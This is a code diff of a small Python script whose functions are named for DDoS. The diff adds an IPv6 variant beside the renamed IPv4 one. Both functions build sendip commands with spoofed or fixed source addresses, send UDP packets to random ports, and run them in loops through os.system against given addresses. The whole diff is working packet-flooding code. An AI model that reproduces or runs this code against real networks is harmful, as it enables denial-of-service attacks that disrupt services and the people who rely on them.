@@ -11,7 +11,7 @@ def generator_ipv4():
     ip = '.'.join([first,two,three,four])
     return ip
 
-def ddos_pack(dip, wip, w_size, c_szie):
+def ddos_packipv4(dip, wip, w_size, c_szie):
     for i in range(w_size):
         sip = generator_ipv4()
         tail_sendip = "sendip  -p ipv4 -is " + sip + " -id " + dip
@@ -20,5 +20,15 @@ def ddos_pack(dip, wip, w_size, c_szie):
             print(tail_sendip)
             os.system(tail_sendip)
 
+def ddos_packipv6(dip, wip, w_size, c_szie):
+    for i in range(w_size):
+        # sip = generator_ipv4()
+        sip = "2001:1::3"
+        tail_sendip = "sendip  -p ipv6 -6s " + sip + " -6d " + dip
+        tail_sendip = tail_sendip + " -p udp -us 5659 -ud " + str(random.randint(0,65535)) +" -d 'xqcc001' " + wip
+        for j in range(c_szie):
+            print(tail_sendip)
+            os.system(tail_sendip)
+
 if __name__ == "__main__":
-    ddos_pack("192.168.1.2", "192.168.2.1", 10, 2)
+    ddos_packipv6("2001:2::1", "2001:1::1", 10, 1)
